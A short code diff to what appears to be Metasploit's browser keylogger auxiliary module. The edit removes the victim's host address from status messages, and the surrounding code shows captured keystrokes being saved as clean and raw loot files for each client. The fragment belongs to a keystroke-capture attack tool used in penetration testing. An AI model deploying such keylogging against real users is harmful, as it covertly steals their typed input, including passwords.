@@ -62,7 +62,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		unless cid
 			cid = generate_client_id(cli,request)
-			print_status("#{cli.peerhost} Assigning client identifier '#{cid}'")
+			print_status("Assigning client identifier '#{cid}'")
 
 			resp = create_response(302, 'Moved')
 			resp['Content-Type'] = 'text/html'
@@ -177,15 +177,15 @@ class Metasploit3 < Msf::Auxiliary
 				:path_clean => store_loot("browser.keystrokes.clean", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Clean)"),
 				:path_raw   => store_loot("browser.keystrokes.raw", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Raw)")
 			}
-			print_good("#{cli.peerhost} [#{cid}] Logging clean keystrokes to: #{@client_cache[cid][:path_clean]}")
-			print_good("#{cli.peerhost} [#{cid}] Logging raw keystrokes to: #{@client_cache[cid][:path_raw]}")
+			print_good("[#{cid}] Logging clean keystrokes to: #{@client_cache[cid][:path_clean]}")
+			print_good("[#{cid}] Logging raw keystrokes to: #{@client_cache[cid][:path_raw]}")
 		end
 
 		::File.open( @client_cache[cid][:path_clean], "a") { |fd| fd.puts nice }
 		::File.open( @client_cache[cid][:path_raw], "a")   { |fd| fd.write(real) }
 
 		if nice.length > 0
-			print_good("#{cli.peerhost} [#{cid}] Keys: #{nice}")
+			print_good("[#{cid}] Keys: #{nice}")
 		end
 
 		nice
